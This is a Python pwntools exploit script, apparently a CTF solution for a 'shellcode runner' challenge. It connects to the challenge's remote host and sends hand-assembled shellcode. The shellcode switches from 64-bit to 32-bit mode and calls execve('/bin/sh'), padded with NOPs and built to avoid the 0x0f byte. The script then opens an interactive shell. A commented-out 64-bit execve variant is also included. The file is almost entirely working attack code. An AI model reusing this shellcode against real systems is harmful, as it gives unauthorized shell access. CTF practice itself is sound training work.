from ptrlib import *
import time
from pwn import *

# io = process("./chall")

# gdb.attach(io)

# sock = Process("./chall")
# sock = Socket("localhost", 9999)
# sock.debug = True

# from pwn import remote
io = remote("c49-shellcode-runner3.hkcert24.pwnable.hk", 1337, ssl=True)
# io = remote("localhost", 1337)

shellcode_64bit = nasm(
    f"""
    ; --- 64-bit から 32-bit に切り替えるシェルコード ---
    mov rsp, 0x13370040
    retf                            ; 64-bit から 32-bit に切り替え
""",
    bits=64,
)

shellcode_32bit = nasm(
    """
    ; --- 32-bit シェルコード (execve("/bin/sh", NULL, NULL)) ---
    mov ebx, 0x13370050             ; ebx に "/bin/sh" のアドレスを設定
    xor ecx, ecx                    ; ecx = NULL (引数)
    xor edx, edx                    ; edx = NULL (環境変数)
    mov eax, 0xb                    ; eax = 0xb (execve システムコール番号)
    int 0x80                        ; システムコールを呼び出す
""",
    bits=32,
)

payload = b""
payload += shellcode_32bit
payload += b"\x90" * (0x50 - len(payload))
payload += b"/bin/sh\x00"
assert b"\x0f" not in payload

io.sendlineafter(b"Input your shellcode here (max: 100): ", payload)

# import time

# time.sleep(1)
# sock.send(
#     nasm(
#         """
# xor edx, edx
# xor esi, esi
# lea rdi, [rel X]
# mov eax, 59
# syscall
# X:db "/bin/sh", 0
# """,
#         bits=64,
#     )
# )

io.interactive()
